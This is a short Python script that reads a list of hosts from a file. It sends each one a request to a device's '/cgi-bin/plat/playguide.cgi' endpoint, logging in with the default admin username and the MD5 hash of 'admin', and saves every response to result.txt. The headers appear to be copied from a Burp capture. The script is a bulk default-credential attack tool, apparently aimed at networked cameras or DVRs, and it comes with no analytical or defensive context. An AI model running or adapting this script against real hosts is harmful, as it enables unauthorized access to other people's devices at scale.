import requests
import sys

session = requests.session()
path=sys.path[0]
print(path)
def attack():
    for line in open(path+ "\\url.txt", encoding='utf-8'):
        #print(line)
        burp0_url = 'http://' + str(line).replace('\n','') + '/cgi-bin/plat/playguide.cgi?action=1&cmd=25&username=admin&upswd=21232f297a57a5a743894a0e4a801fc3&app=0'
        print(burp0_url)
        burp0_cookies = {"AVA_8081_SELECT_IDX_INIT": "100", "AVA_8081_LANG": "SIMPLIFIEDCHINESE"}
        burp0_headers = {"Cache-Control": "max-age=0", "If-Modified-Since": "0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36", "Accept": "*/*", "Referer": "http://42.48.185.96:8081/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
        try:
            response=session.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
        except:
            pass
        f=open(path+ '\\result.txt','a', encoding='utf-8')
        print(burp0_url+'\n')
        print(response.text)
        f.write(burp0_url+'\n')
        f.write(response.text)
        f.write('\n\n')
        f.close()
   
if __name__ == '__main__':
    attack()


